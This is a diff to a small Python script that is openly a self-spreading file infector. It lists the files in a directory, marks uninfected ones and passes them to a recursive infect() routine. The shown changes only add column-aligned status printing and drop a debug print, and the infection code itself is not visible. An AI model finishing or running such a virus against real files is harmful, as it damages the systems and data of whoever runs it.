@@ -6,13 +6,29 @@ def search(path="."):
 	for filename in os.listdir(path): # gets a list of file names in a given path
 		print (filename, end='')
 		if filename.startswith("infected"):
-			print (" Infected")
+			printSpace (filename, " Infected")
 		elif filename == os.path.basename(__file__):
-			print (" Infected")
+			printSpace (filename, " Infected")
 		else:
-			print (" not infected yet... Infecting...")
+			printSpace (filename, " not infected yet... Infecting...")
 			normalFiles.add(filename)
 	return normalFiles
+
+def fileLength():
+	maxLength = 0 # length of longest string
+	normalFiles = list() # set of uninfected file names
+	for filename in os.listdir(os.getcwd()): # gets a list of file names in a given path
+		stringLength = len(filename)
+		if stringLength > maxLength:
+			maxLength = stringLength
+	return maxLength
+
+def printSpace(filename, msg):
+	maxLength = fileLength()
+	realLength = maxLength - len(filename)
+	for x in range(realLength): print (" ", end='')
+	print (" " + msg)
+	
 
 def infect(filelist):
 	error = 0
@@ -27,11 +43,8 @@ def infect(filelist):
 			infect(search())
 			error += 1
 		finally:
-			print (filename + " Success Infected")
+			printSpace (filename, "Success Infected")
 
 filelist = search()
 
-print (filelist)
-
 infect(filelist)
-
